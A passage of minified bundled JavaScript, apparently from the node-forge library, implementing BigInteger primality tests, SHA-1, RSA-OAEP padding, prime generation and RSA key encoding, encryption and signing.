yn=[2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509],Pl=(1<<26)/yn[yn.length-1];function $l(X){var ee,ce=this.abs();if(ce.t==1&&ce.data[0]<=yn[yn.length-1]){for(ee=0;ee<yn.length;++ee)if(ce.data[0]==yn[ee])return!0;return!1}if(ce.isEven())return!1;for(ee=1;ee<yn.length;){for(var ve=yn[ee],Oe=ee+1;Oe<yn.length&&ve<Pl;)ve*=yn[Oe++];for(ve=ce.modInt(ve);ee<Oe;)if(ve%yn[ee++]==0)return!1}return ce.millerRabin(X)}function Ts(X){var ee=this.subtract(t.ONE),ce=ee.getLowestSetBit();if(ce<=0)return!1;for(var ve=ee.shiftRight(ce),Oe=Rl(),je,bt=0;bt<X;++bt){do je=new t(this.bitLength(),Oe);while(je.compareTo(t.ONE)<=0||je.compareTo(ee)>=0);var lt=je.modPow(ve,this);if(lt.compareTo(t.ONE)!=0&&lt.compareTo(ee)!=0){for(var Ti=1;Ti++<ce&&lt.compareTo(ee)!=0;)if(lt=lt.modPowInt(2,this),lt.compareTo(t.ONE)==0)return!1;if(lt.compareTo(ee)!=0)return!1}}return!0}function Rl(){return{nextBytes:function(X){for(var ee=0;ee<X.length;++ee)X[ee]=Math.floor(Math.random()*256)}}}return t.prototype.chunkSize=$e,t.prototype.toRadix=De,t.prototype.fromRadix=Le,t.prototype.fromNumber=it,t.prototype.bitwiseTo=Q,t.prototype.changeBit=Br,t.prototype.addTo=mt,t.prototype.dMultiply=rr,t.prototype.dAddOffset=Kt,t.prototype.multiplyLowerTo=Ar,t.prototype.multiplyUpperTo=ri,t.prototype.modInt=kl,t.prototype.millerRabin=Ts,t.prototype.clone=se,t.prototype.intValue=ne,t.prototype.byteValue=Te,t.prototype.shortValue=Re,t.prototype.signum=Ae,t.prototype.toByteArray=nt,t.prototype.equals=ct,t.prototype.min=St,t.prototype.max=zt,t.prototype.and=H,t.prototype.or=pe,t.prototype.xor=_e,t.prototype.andNot=yt,t.prototype.not=Ye,t.prototype.shiftLeft=$t,t.prototype.shiftRight=xt,t.prototype.getLowestSetBit=Pr,t.prototype.bitCount=Vt,t.prototype.testBit=jr,t.prototype.setBit=Ct,t.prototype.clearBit=er,t.prototype.flipBit=tr,t.prototype.add=or,t.prototype.subtract=ar,t.prototype.multiply=It,t.prototype.divide=cr,t.prototype.remainder=lr,t.prototype.divideAndRemainder=At,t.prototype.modPow=Il,t.prototype.modInverse=Nl,t.prototype.pow=ui,t.prototype.gcd=Tl,t.prototype.isProbablePrime=$l,$_}var R_={exports:{}},O_={exports:{}},jD;function i4(){if(jD)return O_.exports;jD=1;var r=Lr();I0(),Ei();var e=O_.exports=r.sha1=r.sha1||{};r.md.sha1=r.md.algorithms.sha1=e,e.create=function(){i||n();var o=null,a=r.util.createBuffer(),c=new Array(80),l={algorithm:"sha1",blockLength:64,digestLength:20,messageLength:0,fullMessageLength:null,messageLengthSize:8};return l.start=function(){l.messageLength=0,l.fullMessageLength=l.messageLength64=[];for(var u=l.messageLengthSize/4,d=0;d<u;++d)l.fullMessageLength.push(0);return a=r.util.createBuffer(),o={h0:1732584193,h1:4023233417,h2:2562383102,h3:271733878,h4:3285377520},l},l.start(),l.update=function(u,d){d==="utf8"&&(u=r.util.encodeUtf8(u));var h=u.length;l.messageLength+=h,h=[h/4294967296>>>0,h>>>0];for(var f=l.fullMessageLength.length-1;f>=0;--f)l.fullMessageLength[f]+=h[1],h[1]=h[0]+(l.fullMessageLength[f]/4294967296>>>0),l.fullMessageLength[f]=l.fullMessageLength[f]>>>0,h[0]=h[1]/4294967296>>>0;return a.putBytes(u),s(o,c,a),(a.read>2048||a.length()===0)&&a.compact(),l},l.digest=function(){var u=r.util.createBuffer();u.putBytes(a.bytes());var d=l.fullMessageLength[l.fullMessageLength.length-1]+l.messageLengthSize,h=d&l.blockLength-1;u.putBytes(t.substr(0,l.blockLength-h));for(var f,p,g=l.fullMessageLength[0]*8,w=0;w<l.fullMessageLength.length-1;++w)f=l.fullMessageLength[w+1]*8,p=f/4294967296>>>0,g+=p,u.putInt32(g>>>0),g=f>>>0;u.putInt32(g);var m={h0:o.h0,h1:o.h1,h2:o.h2,h3:o.h3,h4:o.h4};s(m,c,u);var x=r.util.createBuffer();return x.putInt32(m.h0),x.putInt32(m.h1),x.putInt32(m.h2),x.putInt32(m.h3),x.putInt32(m.h4),x},l};var t=null,i=!1;function n(){t="",t+=r.util.fillString("\0",64),i=!0}function s(o,a,c){for(var l,u,d,h,f,p,g,w,m=c.length();m>=64;){for(u=o.h0,d=o.h1,h=o.h2,f=o.h3,p=o.h4,w=0;w<16;++w)l=c.getInt32(),a[w]=l,g=f^d&(h^f),l=(u<<5|u>>>27)+g+p+1518500249+l,p=f,f=h,h=(d<<30|d>>>2)>>>0,d=u,u=l;for(;w<20;++w)l=a[w-3]^a[w-8]^a[w-14]^a[w-16],l=l<<1|l>>>31,a[w]=l,g=f^d&(h^f),l=(u<<5|u>>>27)+g+p+1518500249+l,p=f,f=h,h=(d<<30|d>>>2)>>>0,d=u,u=l;for(;w<32;++w)l=a[w-3]^a[w-8]^a[w-14]^a[w-16],l=l<<1|l>>>31,a[w]=l,g=d^h^f,l=(u<<5|u>>>27)+g+p+1859775393+l,p=f,f=h,h=(d<<30|d>>>2)>>>0,d=u,u=l;for(;w<40;++w)l=a[w-6]^a[w-16]^a[w-28]^a[w-32],l=l<<2|l>>>30,a[w]=l,g=d^h^f,l=(u<<5|u>>>27)+g+p+1859775393+l,p=f,f=h,h=(d<<30|d>>>2)>>>0,d=u,u=l;for(;w<60;++w)l=a[w-6]^a[w-16]^a[w-28]^a[w-32],l=l<<2|l>>>30,a[w]=l,g=d&h|f&(d^h),l=(u<<5|u>>>27)+g+p+2400959708+l,p=f,f=h,h=(d<<30|d>>>2)>>>0,d=u,u=l;for(;w<80;++w)l=a[w-6]^a[w-16]^a[w-28]^a[w-32],l=l<<2|l>>>30,a[w]=l,g=d^h^f,l=(u<<5|u>>>27)+g+p+3395469782+l,p=f,f=h,h=(d<<30|d>>>2)>>>0,d=u,u=l;o.h0=o.h0+u|0,o.h1=o.h1+d|0,o.h2=o.h2+h|0,o.h3=o.h3+f|0,o.h4=o.h4+p|0,m-=64}}return O_.exports}var FD;function gJ(){if(FD)return R_.exports;FD=1;var r=Lr();Ei(),Au(),i4();var e=R_.exports=r.pkcs1=r.pkcs1||{};e.encode_rsa_oaep=function(i,n,s){var o,a,c,l;typeof s=="string"?(o=s,a=arguments[3]||void 0,c=arguments[4]||void 0):s&&(o=s.label||void 0,a=s.seed||void 0,c=s.md||void 0,s.mgf1&&s.mgf1.md&&(l=s.mgf1.md)),c?c.start():c=r.md.sha1.create(),l||(l=c);var u=Math.ceil(i.n.bitLength()/8),d=u-2*c.digestLength-2;if(n.length>d){var h=new Error("RSAES-OAEP input message length is too long.");throw h.length=n.length,h.maxLength=d,h}o||(o=""),c.update(o,"raw");for(var f=c.digest(),p="",g=d-n.length,w=0;w<g;w++)p+="\0";var m=f.getBytes()+p+""+n;if(!a)a=r.random.getBytes(c.digestLength);else if(a.length!==c.digestLength){var h=new Error("Invalid RSAES-OAEP seed. The seed length must match the digest length.");throw h.seedLength=a.length,h.digestLength=c.digestLength,h}var x=t(a,u-c.digestLength-1,l),S=r.util.xorBytes(m,x,m.length),T=t(S,c.digestLength,l),k=r.util.xorBytes(a,T,a.length);return"\0"+k+S},e.decode_rsa_oaep=function(i,n,s){var o,a,c;typeof s=="string"?(o=s,a=arguments[3]||void 0):s&&(o=s.label||void 0,a=s.md||void 0,s.mgf1&&s.mgf1.md&&(c=s.mgf1.md));var l=Math.ceil(i.n.bitLength()/8);if(n.length!==l){var S=new Error("RSAES-OAEP encoded message length is invalid.");throw S.length=n.length,S.expectedLength=l,S}if(a===void 0?a=r.md.sha1.create():a.start(),c||(c=a),l<2*a.digestLength+2)throw new Error("RSAES-OAEP key is too short for the hash function.");o||(o=""),a.update(o,"raw");for(var u=a.digest().getBytes(),d=n.charAt(0),h=n.substring(1,a.digestLength+1),f=n.substring(1+a.digestLength),p=t(f,a.digestLength,c),g=r.util.xorBytes(h,p,h.length),w=t(g,l-a.digestLength-1,c),m=r.util.xorBytes(f,w,f.length),x=m.substring(0,a.digestLength),S=d!=="\0",T=0;T<a.digestLength;++T)S|=u.charAt(T)!==x.charAt(T);for(var k=1,I=a.digestLength,E=a.digestLength;E<m.length;E++){var C=m.charCodeAt(E),N=C&1^1,L=k?65534:0;S|=C&L,k=k&N,I+=k}if(S||m.charCodeAt(I)!==1)throw new Error("Invalid RSAES-OAEP padding.");return m.substring(I+1)};function t(i,n,s){s||(s=r.md.sha1.create());for(var o="",a=Math.ceil(n/s.digestLength),c=0;c<a;++c){var l=String.fromCharCode(c>>24&255,c>>16&255,c>>8&255,c&255);s.start(),s.update(i+l),o+=s.digest().getBytes()}return o.substring(0,n)}return R_.exports}var L6={exports:{}},qD;function mJ(){if(qD)return L6.exports;qD=1;var r=Lr();return Ei(),Yx(),Au(),function(){if(r.prime){L6.exports=r.prime;return}var e=L6.exports=r.prime=r.prime||{},t=r.jsbn.BigInteger,i=[6,4,2,4,2,4,6,2],n=new t(null);n.fromInt(30);var s=function(h,f){return h|f};e.generateProbablePrime=function(h,f,p){typeof f=="function"&&(p=f,f={}),f=f||{};var g=f.algorithm||"PRIMEINC";typeof g=="string"&&(g={name:g}),g.options=g.options||{};var w=f.prng||r.random,m={nextBytes:function(x){for(var S=w.getBytesSync(x.length),T=0;T<x.length;++T)x[T]=S.charCodeAt(T)}};if(g.name==="PRIMEINC")return o(h,m,g.options,p);throw new Error("Invalid prime generation algorithm: "+g.name)};function o(h,f,p,g){return"workers"in p?l(h,f,p,g):a(h,f,p,g)}function a(h,f,p,g){var w=u(h,f),m=0,x=d(w.bitLength());"millerRabinTests"in p&&(x=p.millerRabinTests);var S=10;"maxBlockTime"in p&&(S=p.maxBlockTime),c(w,h,f,m,x,S,g)}function c(h,f,p,g,w,m,x){var S=+new Date;do{if(h.bitLength()>f&&(h=u(f,p)),h.isProbablePrime(w))return x(null,h);h.dAddOffset(i[g++%8],0)}while(m<0||+new Date-S<m);r.util.setImmediate(function(){c(h,f,p,g,w,m,x)})}function l(h,f,p,g){if(typeof Worker>"u")return a(h,f,p,g);var w=u(h,f),m=p.workers,x=p.workLoad||100,S=x*30/8,T=p.workerScript||"forge/prime.worker.js";if(m===-1)return r.util.estimateCores(function(I,E){I&&(E=2),m=E-1,k()});k();function k(){m=Math.max(1,m);for(var I=[],E=0;E<m;++E)I[E]=new Worker(T);for(var E=0;E<m;++E)I[E].addEventListener("message",N);var C=!1;function N(L){if(!C){var $=L.data;if($.found){for(var y=0;y<I.length;++y)I[y].terminate();return C=!0,g(null,new t($.prime,16))}w.bitLength()>h&&(w=u(h,f));var A=w.toString(16);L.target.postMessage({hex:A,workLoad:x}),w.dAddOffset(S,0)}}}}function u(h,f){var p=new t(h,f),g=h-1;return p.testBit(g)||p.bitwiseTo(t.ONE.shiftLeft(g),s,p),p.dAddOffset(31-p.mod(n).byteValue(),0),p}function d(h){return h<=100?27:h<=150?18:h<=200?15:h<=250?12:h<=300?9:h<=350?8:h<=400?7:h<=500?6:h<=600?5:h<=800?4:h<=1250?3:2}}(),L6.exports}var B_,zD;function Jx(){if(zD)return B_;zD=1;var r=Lr();if(Yd(),Yx(),e2(),gJ(),mJ(),Au(),Ei(),typeof e>"u")var e=r.jsbn.BigInteger;var t=r.util.isNodejs?w3:null,i=r.asn1,n=r.util;r.pki=r.pki||{},B_=r.pki.rsa=r.rsa=r.rsa||{};var s=r.pki,o=[6,4,2,4,2,4,6,2],a={name:"PrivateKeyInfo",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"PrivateKeyInfo.version",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyVersion"},{name:"PrivateKeyInfo.privateKeyAlgorithm",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"AlgorithmIdentifier.algorithm",tagClass:i.Class.UNIVERSAL,type:i.Type.OID,constructed:!1,capture:"privateKeyOid"}]},{name:"PrivateKeyInfo",tagClass:i.Class.UNIVERSAL,type:i.Type.OCTETSTRING,constructed:!1,capture:"privateKey"}]},c={name:"RSAPrivateKey",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"RSAPrivateKey.version",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyVersion"},{name:"RSAPrivateKey.modulus",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyModulus"},{name:"RSAPrivateKey.publicExponent",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyPublicExponent"},{name:"RSAPrivateKey.privateExponent",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyPrivateExponent"},{name:"RSAPrivateKey.prime1",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyPrime1"},{name:"RSAPrivateKey.prime2",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyPrime2"},{name:"RSAPrivateKey.exponent1",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyExponent1"},{name:"RSAPrivateKey.exponent2",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyExponent2"},{name:"RSAPrivateKey.coefficient",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"privateKeyCoefficient"}]},l={name:"RSAPublicKey",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"RSAPublicKey.modulus",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"publicKeyModulus"},{name:"RSAPublicKey.exponent",tagClass:i.Class.UNIVERSAL,type:i.Type.INTEGER,constructed:!1,capture:"publicKeyExponent"}]},u=r.pki.rsa.publicKeyValidator={name:"SubjectPublicKeyInfo",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,captureAsn1:"subjectPublicKeyInfo",value:[{name:"SubjectPublicKeyInfo.AlgorithmIdentifier",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"AlgorithmIdentifier.algorithm",tagClass:i.Class.UNIVERSAL,type:i.Type.OID,constructed:!1,capture:"publicKeyOid"}]},{name:"SubjectPublicKeyInfo.subjectPublicKey",tagClass:i.Class.UNIVERSAL,type:i.Type.BITSTRING,constructed:!1,value:[{name:"SubjectPublicKeyInfo.subjectPublicKey.RSAPublicKey",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,optional:!0,captureAsn1:"rsaPublicKey"}]}]},d={name:"DigestInfo",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"DigestInfo.DigestAlgorithm",tagClass:i.Class.UNIVERSAL,type:i.Type.SEQUENCE,constructed:!0,value:[{name:"DigestInfo.DigestAlgorithm.algorithmIdentifier",tagClass:i.Class.UNIVERSAL,type:i.Type.OID,constructed:!1,capture:"algorithmIdentifier"},{name:"DigestInfo.DigestAlgorithm.parameters",tagClass:i.Class.UNIVERSAL,type:i.Type.NULL,capture:"parameters",optional:!0,constructed:!1}]},{name:"DigestInfo.digest",tagClass:i.Class.UNIVERSAL,type:i.Type.OCTETSTRING,constructed:!1,capture:"digest"}]},h=function(E){var C;if(E.algorithm in s.oids)C=s.oids[E.algorithm];else{var N=new Error("Unknown message digest algorithm.");throw N.algorithm=E.algorithm,N}var L=i.oidToDer(C).getBytes(),$=i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[]),y=i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[]);y.value.push(i.create(i.Class.UNIVERSAL,i.Type.OID,!1,L)),y.value.push(i.create(i.Class.UNIVERSAL,i.Type.NULL,!1,""));var A=i.create(i.Class.UNIVERSAL,i.Type.OCTETSTRING,!1,E.digest().getBytes());return $.value.push(y),$.value.push(A),i.toDer($).getBytes()},f=function(E,C,N){if(N)return E.modPow(C.e,C.n);if(!C.p||!C.q)return E.modPow(C.d,C.n);C.dP||(C.dP=C.d.mod(C.p.subtract(e.ONE))),C.dQ||(C.dQ=C.d.mod(C.q.subtract(e.ONE))),C.qInv||(C.qInv=C.q.modInverse(C.p));var L;do L=new e(r.util.bytesToHex(r.random.getBytes(C.n.bitLength()/8)),16);while(L.compareTo(C.n)>=0||!L.gcd(C.n).equals(e.ONE));E=E.multiply(L.modPow(C.e,C.n)).mod(C.n);for(var $=E.mod(C.p).modPow(C.dP,C.p),y=E.mod(C.q).modPow(C.dQ,C.q);$.compareTo(y)<0;)$=$.add(C.p);var A=$.subtract(y).multiply(C.qInv).mod(C.p).multiply(C.q).add(y);return A=A.multiply(L.modInverse(C.n)).mod(C.n),A};s.rsa.encrypt=function(E,C,N){var L=N,$,y=Math.ceil(C.n.bitLength()/8);N!==!1&&N!==!0?(L=N===2,$=p(E,C,N)):($=r.util.createBuffer(),$.putBytes(E));for(var A=new e($.toHex(),16),b=f(A,C,L),v=b.toString(16),_=r.util.createBuffer(),O=y-Math.ceil(v.length/2);O>0;)_.putByte(0),--O;return _.putBytes(r.util.hexToBytes(v)),_.getBytes()},s.rsa.decrypt=function(E,C,N,L){var $=Math.ceil(C.n.bitLength()/8);if(E.length!==$){var y=new Error("Encrypted message length is invalid.");throw y.length=E.length,y.expected=$,y}var A=new e(r.util.createBuffer(E).toHex(),16);if(A.compareTo(C.n)>=0)throw new Error("Encrypted message is invalid.");for(var b=f(A,C,N),v=b.toString(16),_=r.util.createBuffer(),O=$-Math.ceil(v.length/2);O>0;)_.putByte(0),--O;return _.putBytes(r.util.hexToBytes(v)),L!==!1?g(_.getBytes(),C,N):_.getBytes()},s.rsa.createKeyPairGenerationState=function(E,C,N){typeof E=="string"&&(E=parseInt(E,10)),E=E||2048,N=N||{};var L=N.prng||r.random,$={nextBytes:function(b){for(var v=L.getBytesSync(b.length),_=0;_<b.length;++_)b[_]=v.charCodeAt(_)}},y=N.algorithm||"PRIMEINC",A;if(y==="PRIMEINC")A={algorithm:y,state:0,bits:E,rng:$,eInt:C||65537,e:new e(null),p:null,q:null,qBits:E>>1,pBits:E-(E>>1),pqState:0,num:null,keys:null},A.e.fromInt(A.eInt);else throw new Error("Invalid key generation algorithm: "+y);return A},s.rsa.stepKeyPairGenerationState=function(E,C){"algorithm"in E||(E.algorithm="PRIMEINC");var N=new e(null);N.fromInt(30);for(var L=0,$=function(D,R){return D|R},y=+new Date,A,b=0;E.keys===null&&(C<=0||b<C);){if(E.state===0){var v=E.p===null?E.pBits:E.qBits,_=v-1;E.pqState===0?(E.num=new e(v,E.rng),E.num.testBit(_)||E.num.bitwiseTo(e.ONE.shiftLeft(_),$,E.num),E.num.dAddOffset(31-E.num.mod(N).byteValue(),0),L=0,++E.pqState):E.pqState===1?E.num.bitLength()>v?E.pqState=0:E.num.isProbablePrime(x(E.num.bitLength()))?++E.pqState:E.num.dAddOffset(o[L++%8],0):E.pqState===2?E.pqState=E.num.subtract(e.ONE).gcd(E.e).compareTo(e.ONE)===0?3:0:E.pqState===3&&(E.pqState=0,E.p===null?E.p=E.num:E.q=E.num,E.p!==null&&E.q!==null&&++E.state,E.num=null)}else if(E.state===1)E.p.compareTo(E.q)<0&&(E.num=E.p,E.p=E.q,E.q=E.num),++E.state;else if(E.state===2)E.p1=E.p.subtract(e.ONE),E.q1=E.q.subtract(e.ONE),E.phi=E.p1.multiply(E.q1),++E.state;else if(E.state===3)E.phi.gcd(E.e).compareTo(e.ONE)===0?++E.state:(E.p=null,E.q=null,E.state=0);else if(E.state===4)E.n=E.p.multiply(E.q),E.n.bitLength()===E.bits?++E.state:(E.q=null,E.state=0);else if(E.state===5){var O=E.e.modInverse(E.phi);E.keys={privateKey:s.rsa.setPrivateKey(E.n,E.e,O,E.p,E.q,O.mod(E.p1),O.mod(E.q1),E.q.modInverse(E.p)),publicKey:s.rsa.setPublicKey(E.n,E.e)}}A=+new Date,b+=A-y,y=A}return E.keys!==null},s.rsa.generateKeyPair=function(E,C,N,L){if(arguments.length===1?typeof E=="object"?(N=E,E=void 0):typeof E=="function"&&(L=E,E=void 0):arguments.length===2?typeof E=="number"?typeof C=="function"?(L=C,C=void 0):typeof C!="number"&&(N=C,C=void 0):(N=E,L=C,E=void 0,C=void 0):arguments.length===3&&(typeof C=="number"?typeof N=="function"&&(L=N,N=void 0):(L=N,N=C,C=void 0)),N=N||{},E===void 0&&(E=N.bits||2048),C===void 0&&(C=N.e||65537),!r.options.usePureJavaScript&&!N.prng&&E>=256&&E<=16384&&(C===65537||C===3)){if(L){if(S("generateKeyPair"))return t.generateKeyPair("rsa",{modulusLength:E,publicExponent:C,publicKeyEncoding:{type:"spki",format:"pem"},privateKeyEncoding:{type:"pkcs8",format:"pem"}},function(b,v,_){if(b)return L(b);L(null,{privateKey:s.privateKeyFromPem(_),publicKey:s.publicKeyFromPem(v)})});if(T("generateKey")&&T("exportKey"))return n.globalScope.crypto.subtle.generateKey({name:"RSASSA-PKCS1-v1_5",modulusLength:E,publicExponent:I(C),hash:{name:"SHA-256"}},!0,["sign","verify"]).then(function(b){return n.globalScope.crypto.subtle.exportKey("pkcs8",b.privateKey)}).then(void 0,function(b){L(b)}).then(function(b){if(b){var v=s.privateKeyFromAsn1(i.fromDer(r.util.createBuffer(b)));L(null,{privateKey:v,publicKey:s.setRsaPublicKey(v.n,v.e)})}});if(k("generateKey")&&k("exportKey")){var $=n.globalScope.msCrypto.subtle.generateKey({name:"RSASSA-PKCS1-v1_5",modulusLength:E,publicExponent:I(C),hash:{name:"SHA-256"}},!0,["sign","verify"]);$.oncomplete=function(b){var v=b.target.result,_=n.globalScope.msCrypto.subtle.exportKey("pkcs8",v.privateKey);_.oncomplete=function(O){var D=O.target.result,R=s.privateKeyFromAsn1(i.fromDer(r.util.createBuffer(D)));L(null,{privateKey:R,publicKey:s.setRsaPublicKey(R.n,R.e)})},_.onerror=function(O){L(O)}},$.onerror=function(b){L(b)};return}}else if(S("generateKeyPairSync")){var y=t.generateKeyPairSync("rsa",{modulusLength:E,publicExponent:C,publicKeyEncoding:{type:"spki",format:"pem"},privateKeyEncoding:{type:"pkcs8",format:"pem"}});return{privateKey:s.privateKeyFromPem(y.privateKey),publicKey:s.publicKeyFromPem(y.publicKey)}}}var A=s.rsa.createKeyPairGenerationState(E,C,N);if(!L)return s.rsa.stepKeyPairGenerationState(A,0),A.keys;w(A,N,L)},s.setRsaPublicKey=s.rsa.setPublicKey=function(E,C){var N={n:E,e:C};return N.encrypt=function(L,$,y){if(typeof $=="string"?$=$.toUpperCase():$===void 0&&($="RSAES-PKCS1-V1_5"),$==="RSAES-PKCS1-V1_5")$={encode:function(b,v,_){return p(b,v,2).getBytes()}};else if($==="RSA-OAEP"||$==="RSAES-OAEP")$={encode:function(b,v){return r.pkcs1.encode_rsa_oaep(v,b,y)}};else if(["RAW","NONE","NULL",null].indexOf($)!==-1)$={encode:function(b){return b}};else if(typeof $=="string")throw new Error('Unsupported encryption scheme: "'+$+'".');var A=$.encode(L,N,!0);return s.rsa.encrypt(A,N,!0)},N.verify=function(L,$,y,A){typeof y=="string"?y=y.toUpperCase():y===void 0&&(y="RSASSA-PKCS1-V1_5"),A===void 0&&(A={_parseAllDigestBytes:!0}),"_parseAllDigestBytes"in A||(A._parseAllDigestBytes=!0),y==="RSASSA-PKCS1-V1_5"?y={verify:function(v,_){_=g(_,N,!0);var O=i.fromDer(_,{parseAllBytes:A._parseAllDigestBytes}),D={},R=[];if(!i.validate(O,d,D,R)){var P=new Error("ASN.1 object does not contain a valid RSASSA-PKCS1-v1_5 DigestInfo value.");throw P.errors=R,P}var B=i.derToOid(D.algorithmIdentifier);if(!(B===r.oids.md2||B===r.oids.md5||B===r.oids.sha1||B===r.oids.sha224||B===r.oids.sha256||B===r.oids.sha384||B===r.oids.sha512||B===r.oids["sha512-224"]||B===r.oids["sha512-256"])){var P=new Error("Unknown RSASSA-PKCS1-v1_5 DigestAlgorithm identifier.");throw P.oid=B,P}if((B===r.oids.md2||B===r.oids.md5)&&!("parameters"in D))throw new Error("ASN.1 object does not contain a valid RSASSA-PKCS1-v1_5 DigestInfo value. Missing algorithm identifer NULL parameters.");return v===D.digest}}:(y==="NONE"||y==="NULL"||y===null)&&(y={verify:function(v,_){return _=g(_,N,!0),v===_}});var b=s.rsa.decrypt($,N,!0,!1);return y.verify(L,b,N.n.bitLength())},N},s.setRsaPrivateKey=s.rsa.setPrivateKey=function(E,C,N,L,$,y,A,b){var v={n:E,e:C,d:N,p:L,q:$,dP:y,dQ:A,qInv:b};return v.decrypt=function(_,O,D){typeof O=="string"?O=O.toUpperCase():O===void 0&&(O="RSAES-PKCS1-V1_5");var R=s.rsa.decrypt(_,v,!1,!1);if(O==="RSAES-PKCS1-V1_5")O={decode:g};else if(O==="RSA-OAEP"||O==="RSAES-OAEP")O={decode:function(P,B){return r.pkcs1.decode_rsa_oaep(B,P,D)}};else if(["RAW","NONE","NULL",null].indexOf(O)!==-1)O={decode:function(P){return P}};else throw new Error('Unsupported encryption scheme: "'+O+'".');return O.decode(R,v,!1)},v.sign=function(_,O){var D=!1;typeof O=="string"&&(O=O.toUpperCase()),O===void 0||O==="RSASSA-PKCS1-V1_5"?(O={encode:h},D=1):(O==="NONE"||O==="NULL"||O===null)&&(O={encode:function(){return _}},D=1);var R=O.encode(_,v.n.bitLength());return s.rsa.encrypt(R,v,D)},v},s.wrapRsaPrivateKey=function(E){return i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,i.integerToDer(0).getBytes()),i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[i.create(i.Class.UNIVERSAL,i.Type.OID,!1,i.oidToDer(s.oids.rsaEncryption).getBytes()),i.create(i.Class.UNIVERSAL,i.Type.NULL,!1,"")]),i.create(i.Class.UNIVERSAL,i.Type.OCTETSTRING,!1,i.toDer(E).getBytes())])},s.privateKeyFromAsn1=function(E){var C={},N=[];if(i.validate(E,a,C,N)&&(E=i.fromDer(r.util.createBuffer(C.privateKey))),C={},N=[],!i.validate(E,c,C,N)){var L=new Error("Cannot read private key. ASN.1 object does not contain an RSAPrivateKey.");throw L.errors=N,L}var $,y,A,b,v,_,O,D;return $=r.util.createBuffer(C.privateKeyModulus).toHex(),y=r.util.createBuffer(C.privateKeyPublicExponent).toHex(),A=r.util.createBuffer(C.privateKeyPrivateExponent).toHex(),b=r.util.createBuffer(C.privateKeyPrime1).toHex(),v=r.util.createBuffer(C.privateKeyPrime2).toHex(),_=r.util.createBuffer(C.privateKeyExponent1).toHex(),O=r.util.createBuffer(C.privateKeyExponent2).toHex(),D=r.util.createBuffer(C.privateKeyCoefficient).toHex(),s.setRsaPrivateKey(new e($,16),new e(y,16),new e(A,16),new e(b,16),new e(v,16),new e(_,16),new e(O,16),new e(D,16))},s.privateKeyToAsn1=s.privateKeyToRSAPrivateKey=function(E){return i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,i.integerToDer(0).getBytes()),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.n)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.e)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.d)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.p)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.q)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.dP)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.dQ)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.qInv))])},s.publicKeyFromAsn1=function(E){var C={},N=[];if(i.validate(E,u,C,N)){var L=i.derToOid(C.publicKeyOid);if(L!==s.oids.rsaEncryption){var $=new Error("Cannot read public key. Unknown OID.");throw $.oid=L,$}E=C.rsaPublicKey}if(N=[],!i.validate(E,l,C,N)){var $=new Error("Cannot read public key. ASN.1 object does not contain an RSAPublicKey.");throw $.errors=N,$}var y=r.util.createBuffer(C.publicKeyModulus).toHex(),A=r.util.createBuffer(C.publicKeyExponent).toHex();return s.setRsaPublicKey(new e(y,16),new e(A,16))},s.publicKeyToAsn1=s.publicKeyToSubjectPublicKeyInfo=function(E){return i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[i.create(i.Class.UNIVERSAL,i.Type.OID,!1,i.oidToDer(s.oids.rsaEncryption).getBytes()),i.create(i.Class.UNIVERSAL,i.Type.NULL,!1,"")]),i.create(i.Class.UNIVERSAL,i.Type.BITSTRING,!1,[s.publicKeyToRSAPublicKey(E)])])},s.publicKeyToRSAPublicKey=function(E){return 